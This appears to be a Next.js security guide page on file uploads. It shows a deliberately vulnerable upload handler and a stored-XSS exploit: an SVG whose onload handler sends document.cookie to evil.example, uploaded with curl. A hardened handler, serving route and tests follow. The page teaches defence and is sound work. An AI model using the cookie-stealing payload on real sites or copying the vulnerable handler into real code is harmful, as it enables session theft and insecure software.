---
title: File uploads
description: Trusting the client-supplied content type and writing into public/ lets an attacker serve executable HTML — verify magic bytes, rename, and store outside the web root.
group: nextjs-security
order: 100
status: current
related: [nextjs-backend/file-uploads, nextjs-mutations/server-actions, nextjs-backend/route-handlers, nextjs-security/input-validation]
---

## Overview

An upload endpoint accepts bytes from anyone. Three decisions turn it into a
vulnerability: trusting the `type` and filename the client sent, and writing the
file into `public/`, where Next.js serves it as a static asset. Together they let
an attacker upload a file that looks like an image and behaves like a script in
your users' browsers.

This page shows that upload, exploits it with an SVG that runs JavaScript, then
fixes it with an early size limit, magic-byte content sniffing via `file-type`, a
server-generated name, storage outside `public/`, and safe serving headers.
[File uploads](../nextjs-backend/file-uploads.md) in the Backend group covers the
non-security mechanics (streaming, `bodySizeLimit`, proxy buffering).

## The threat

- **The `Content-Type` is a claim.** `file.type` comes from the browser and is
  trivially forged. A `.png` extension is just a string.
- **`public/` is executable ground.** A file at `public/uploads/x.html` is
  served from your origin. HTML and SVG can contain `<script>`, and SVG counts
  as an image to an `<img>` tag but runs script when opened as a document. Script
  served from your origin is same-origin: it reads your cookies and calls your
  APIs as the victim (stored XSS).
- **The filename is attacker-controlled.** `../../etc/passwd`, a name that
  overwrites another user's file, or one with a double extension
  (`avatar.png.html`) are all things a client can send.
- **Size is a weapon.** Without an early limit, a huge upload exhausts memory or
  disk.

## Exploit

```ts file="app/api/avatars/route.ts" vulnerable
import { writeFile } from 'node:fs/promises';
import path from 'node:path';
import type { NextRequest } from 'next/server';

export async function POST(request: NextRequest) {
  const form = await request.formData();
  const file = form.get('avatar') as File;

  // Trusts the client's content type...
  if (!file.type.startsWith('image/')) {
    return Response.json({ error: 'Images only' }, { status: 400 });
  }

  // ...trusts the client's filename, and writes into public/.
  const dest = path.join(process.cwd(), 'public', 'uploads', file.name);
  await writeFile(dest, Buffer.from(await file.arrayBuffer()));

  return Response.json({ url: `/uploads/${file.name}` });
}
```

The attacker uploads an SVG that carries the `image/png` content type but
contains script, with an `.svg` name:

```bash
cat > xss.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.example/steal?c='+encodeURIComponent(document.cookie))">
</svg>
SVG

curl -s https://app.example.com/api/avatars \
  -F 'avatar=@xss.svg;type=image/png;filename=xss.svg'
# {"url":"/uploads/xss.svg"}
```

The `image/png` claim passes the `startsWith('image/')` check. The file lands in
`public/uploads/xss.svg` and is served from your origin. When a victim opens
`https://app.example.com/uploads/xss.svg`, the `onload` handler runs and
exfiltrates their cookies. An HTML file with a `.png` name behaves the same way
in browsers that sniff content.

## Fix

Validate size early, sniff the real type from the bytes, reject anything not on
an allow-list, generate the name and extension yourself, and store outside
`public/`:

```ts file="app/api/avatars/route.ts"
import { mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileTypeFromBuffer } from 'file-type';
import type { NextRequest } from 'next/server';
import { verifySession } from '@/lib/dal';

const MAX_BYTES = 2 * 1024 * 1024;

// Map verified MIME types to the extension WE choose. Note: image/svg+xml is
// deliberately absent — SVG is a script-capable document, not a safe raster image.
const ALLOWED: Record<string, string> = {
  'image/png': 'png',
  'image/jpeg': 'jpg',
  'image/webp': 'webp',
};

const UPLOAD_DIR = path.join(process.cwd(), 'storage', 'avatars');

export async function POST(request: NextRequest) {
  const session = await verifySession();
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });

  const form = await request.formData();
  const file = form.get('avatar');
  if (!(file instanceof File)) return Response.json({ error: 'No file' }, { status: 400 });

  // 1. Reject oversize before reading further work into memory.
  if (file.size > MAX_BYTES) return Response.json({ error: 'Too large' }, { status: 413 });

  const bytes = new Uint8Array(await file.arrayBuffer());

  // 2. Sniff the real type from magic bytes; ignore file.type and file.name.
  const sniffed = await fileTypeFromBuffer(bytes);
  const extension = sniffed && ALLOWED[sniffed.mime];
  if (!extension) {
    // file-type does not detect text formats (SVG, HTML), so they fail here too.
    return Response.json({ error: 'Unsupported image type' }, { status: 415 });
  }

  // 3. Generate the name and extension. The client's filename is never used.
  const storedName = `${crypto.randomUUID()}.${extension}`;
  await mkdir(UPLOAD_DIR, { recursive: true });
  // `wx` fails if the name somehow already exists, so an upload can't overwrite.
  await writeFile(path.join(UPLOAD_DIR, storedName), bytes, { flag: 'wx' });

  await recordAvatar(session.userId, storedName);
  return Response.json({ ok: true });
}

declare function recordAvatar(userId: string, storedName: string): Promise<void>;
```

Serve the stored files through a Route Handler that authorizes, sets the sniffed
type, and forbids sniffing and inline rendering:

```ts file="app/api/avatars/[name]/route.ts"
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import type { NextRequest } from 'next/server';
import { verifySession } from '@/lib/dal';

const UPLOAD_DIR = path.join(process.cwd(), 'storage', 'avatars');
const CONTENT_TYPES: Record<string, string> = {
  png: 'image/png',
  jpg: 'image/jpeg',
  webp: 'image/webp',
};

export async function GET(_request: NextRequest, ctx: RouteContext<'/api/avatars/[name]'>) {
  const session = await verifySession();
  if (!session) return new Response('Unauthorized', { status: 401 });

  const { name } = await ctx.params;
  // Only our own generated shape is accepted; no path traversal is possible.
  const match = /^([0-9a-f-]{36})\.(png|jpg|webp)$/.exec(name);
  if (!match) return new Response('Not found', { status: 404 });

  const bytes = await readFile(path.join(UPLOAD_DIR, name)).catch(() => null);
  if (!bytes) return new Response('Not found', { status: 404 });

  return new Response(bytes, {
    headers: {
      'Content-Type': CONTENT_TYPES[match[2]],
      'X-Content-Type-Options': 'nosniff',
      'Content-Disposition': 'inline; filename="avatar"',
      'Content-Security-Policy': "default-src 'none'; sandbox",
    },
  });
}
```

Why this works:

- **The type comes from the bytes.** `fileTypeFromBuffer` reads magic numbers, so
  a forged `Content-Type` is ignored. Its own README notes it does not detect
  text-based formats such as SVG and HTML, so a script-bearing SVG returns
  `undefined` and is rejected. The allow-list also omits `image/svg+xml`.
- **The file never enters `public/`.** It lives under `storage/`, outside the web
  root, reachable only through the authorized handler.
- **The name is ours.** A UUID plus an extension we picked defeats path
  traversal, double-extension tricks and overwrites. `flag: 'wx'` refuses to
  write over an existing file.
- **Serving headers defang whatever slips through.** `nosniff` stops the browser
  guessing a different type, `Content-Disposition` and a restrictive CSP stop any
  document from executing script in your origin.
- **The size check is first.** Oversize uploads are rejected before more work.

For Server Actions, cap the raw request body with
`experimental.serverActions.bodySizeLimit` in `next.config` (default 1 MB); see
[File uploads](../nextjs-backend/file-uploads.md).

## Verify the fix

The disguised SVG is now refused, and it is never written to `public/`:

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://app.example.com/api/avatars \
  -H 'Cookie: session=<s>' -F 'avatar=@xss.svg;type=image/png;filename=avatar.png'
# 415

ls public/uploads 2>/dev/null | grep -c xss
# 0 (the directory does not even exist)

# A real PNG succeeds:
curl -s -o /dev/null -w '%{http_code}\n' https://app.example.com/api/avatars \
  -H 'Cookie: session=<s>' -F 'avatar=@real.png'
# 200
```

A test feeds the magic bytes of each case and asserts the outcome:

```ts file="e2e/file-uploads.spec.ts"
import { expect, test } from '@playwright/test';

const PNG_MAGIC = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const SVG = Buffer.from('<svg onload="alert(1)"></svg>');

test('a script SVG mislabeled as PNG is rejected; a real PNG is accepted', async ({ request }) => {
  const evil = await request.post('/api/avatars', {
    headers: { Cookie: 'session=demo' },
    multipart: { avatar: { name: 'x.png', mimeType: 'image/png', buffer: SVG } },
  });
  expect(evil.status()).toBe(415);

  const ok = await request.post('/api/avatars', {
    headers: { Cookie: 'session=demo' },
    multipart: { avatar: { name: 'a.png', mimeType: 'image/png', buffer: PNG_MAGIC } },
  });
  expect(ok.ok()).toBe(true);
});
```

Also confirm the serving handler sends `X-Content-Type-Options: nosniff` and does
not serve a file with a traversal path (`../../lib/db.ts` must return 404).

## Common patterns

- **Pre-signed direct uploads** to object storage for large files: the Next.js
  server issues a scoped URL and records the result, and never proxies the bytes.
- **A dedicated asset domain** (or `Content-Disposition: attachment`) so even a
  served file is not same-origin with your app.
- **Background scanning** (thumbnails, malware checks) on a queue after the
  upload, not inline; see
  [Background work](../nextjs-backend/background-work.md).

> [!NOTE]
> `file-type` 22.1.0 is ESM-only and lists Node.js 22+ in its `engines`. Check
> it against your deployment's Node.js version, or pin an earlier release that
> supports it.

## Common mistakes

**Trusting `file.type` or the extension.** Both are client-supplied. Sniff the
bytes.

**Writing into `public/`.** Anything there is served from your origin as a static
asset. Store outside the web root and serve through a handler.

**Keeping the client's filename.** It enables traversal, overwrite and
double-extension attacks. Generate the name.

**Allowing SVG as an image.** SVG executes script. If you must accept it,
sanitize it server-side and serve it with `Content-Disposition: attachment` and a
sandbox CSP.

**Checking size only after buffering.** Read `file.size` first, and stream with a
byte counter for large uploads; see [File uploads](../nextjs-backend/file-uploads.md).

**Serving uploads without `nosniff`.** A browser may sniff a mislabeled file back
into an executable type. Always send `X-Content-Type-Options: nosniff`.

## Related topics

- [File uploads](../nextjs-backend/file-uploads.md) — streaming, `bodySizeLimit`
  and proxy body buffering.
- [Server Actions](../nextjs-mutations/server-actions.md) — receiving `File`
  objects in `FormData`.
- [Route Handlers](../nextjs-backend/route-handlers.md) — reading multipart
  bodies and setting response headers.
- [Input validation](./input-validation.md) — validating the other fields that
  accompany an upload.
- [Directives](../server-react/directives.md) — why the upload endpoint is a
  public server entry point.
